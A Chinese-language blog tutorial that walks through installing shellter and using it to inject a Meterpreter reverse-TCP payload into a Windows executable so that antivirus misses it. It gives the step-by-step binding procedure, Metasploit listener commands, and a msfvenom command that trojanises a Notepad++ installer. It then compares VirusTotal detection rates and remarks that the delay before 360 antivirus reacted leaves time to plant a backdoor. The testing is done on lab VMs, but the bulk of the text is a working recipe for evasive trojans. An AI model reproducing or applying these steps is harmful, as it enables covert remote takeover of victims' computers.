---
title: 免杀捆绑工具 shellter 的安装及使用
date: 2022-4-16 18:10:24
tags: [Trojan horse,Linux,Kali,Metasploit,shellter]
categories: 
 - [Cyber Security,木马]
cover: https://res.cloudinary.com/sycamore/image/upload/v1682443290/Typera/2023/04/d9bcdac19a99f14fe88a3ed9e829d637.png
---

:::default
**shellter** 是一个**捆绑**工具，采用动态 **shellcode** 注入 的方式，将 **shellcode** 注入到其它程序中，达到**免杀**的效果，躲避杀软的查杀。
:::

## shellter 安装
1. 添加 **i386 32位** 架构支持、更新 **apt**、安装 **wine** 依赖：
	- `dpkg --add-architecture i386 && apt update && apt -y install wine32`
2. 安装 **shellter**：
	- `apt install shellter`
	![image-20230426011840045](https://res.cloudinary.com/sycamore/image/upload/v1682443125/Typera/2023/04/0c4297a033272d1212d9cb86e4daf005.png)
## shellter 使用
> 使用 shellter 捆绑 Meterpreter_Reverse_TCP

**捆绑步骤：**
1. 命令行输入 `shellter` 打开工具
2. 输入 `A` 或者 `a`，选择 **自动模式**；
3. `PE Target:` 后输入要进行 **捆绑** 的 **文件路径**
![image-20230426011919683](https://res.cloudinary.com/sycamore/image/upload/v1682443164/Typera/2023/04/272fa29e9da9d004a3cf25b87079f7de.png)
<br>
4. 输入`Y`，进入 **隐形模式**
![image-20230426011923428](https://res.cloudinary.com/sycamore/image/upload/v1682443168/Typera/2023/04/0ac54c6f74fda57f2a51ac0b8bde409f.png)
<br>
5. 输入`L`，使用 **payload** 攻击模块列表（即上面的 **1~7** ）
6. **payload** 编号选择 `1` ，使用 Meterpreter_Reverse_TCP 攻击
![image-20230426011927372](https://res.cloudinary.com/sycamore/image/upload/v1682443172/Typera/2023/04/073c31195d0c78a68e8b3c2fecbc8531.png)
<br>
7. 分别输入监听端的 **IP**、**端口号**
![image-20230426011931101](https://res.cloudinary.com/sycamore/image/upload/v1682443175/Typera/2023/04/396417290b20f351cc3c1d96669a3c4e.png)
<br>
8. 按 `[Enter]` 退出 **shellter** ：
![image-20230426011934700](https://res.cloudinary.com/sycamore/image/upload/v1682443179/Typera/2023/04/0169aba2f4b7dfa0ba83b3304994339f.png)

<br>

**[ 关于生成的文件 ]**
> **捆绑完毕**的文件 会代替 **原文件** ，即出现在 原文件目录 下，**名字相同**
> 而**原文件**会 **备份** 在目录 `/root/Shellter_Backups/` ：
> ![image-20230426011938517](https://res.cloudinary.com/sycamore/image/upload/v1682443183/Typera/2023/04/9b58fed5ce217d4b84967579f2522d55.png)
## 利用 & 免杀效果
### 利用
1. 上传到 **Win7_x64** 虚拟机，
2. **Kali_Linux** 虚拟机打开 **msf** （命令 `msfconsole`），监听**反弹 shell**：
	- `use exploit/multi/handler`
	- `set payload windows/meterpreter/reverse_tcp`
	- `set LHOST 192.168.158.139`
	- `set LPORT 4444`
	- `run`

**反弹 shell** 成功！
![image-20230426011944783](https://res.cloudinary.com/sycamore/image/upload/v1682443189/Typera/2023/04/4eff497abdd31d7be53e51e0d88f75f7.png)

### 免杀效果
我的 **Win7_x64 虚拟机** 安装了 **360 全家桶**，

但是 **静态检测** 貌似并没有查出 **木马文件** ~

运行木马程序，并成功获得 **meterpreter** 的 **shell** 之后，**360** 竟然也没有第一时间报毒。。。 什么情况 (⊙_⊙)？

大概一分钟之后，才提示有木马：
![image-20230426011949574](https://res.cloudinary.com/sycamore/image/upload/v1682443194/Typera/2023/04/69719cbb27c9df97660f0c6405be89c7.png)
（实际上这个时间足够黑客 **迁移进程** 并 **布置后门** 了)

当然，如果你的电脑以前中过这个毒，**360** 会第一时间反应过来
（但这要是**还没反应**，**360** 就该进回收站了）

然后看看 **virustotal** 的检测情况（**31 / 70**）：[检测报告 传送门1](https://www.virustotal.com/gui/file/e4e97bef85f3970d42e81d6f75815050d7ff2370790888fe9d78948bc83b30a7)
![image-20230426011954090](https://res.cloudinary.com/sycamore/image/upload/v1682443198/Typera/2023/04/6a65ae126f5f5f5c0658d6165d837a04.png)

***对比 ：***
使用 同程序 同**payload**，用 **msf** 自带的捆绑手段生成的木马：
（命令：`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.158.139 LPORT=4444 -x npp.8.1.4.Installer.exe -f exe > mp_npp.exe`）

**virustotal** 的检测情况（**40 /  70**）：[检测报告 传送门2](https://www.virustotal.com/gui/file/c3a7c2280e4aa9aa0693729049f7f8e0ff05e253c1047ef282748c3509687207)
![image-20230426011958597](https://res.cloudinary.com/sycamore/image/upload/v1682443202/Typera/2023/04/c0631de31f6d8f365c052ec14a014b37.png)

> 相比较而言，可以说 **shellter** 的捆绑**免杀**效果比 **msf** 好很多了。
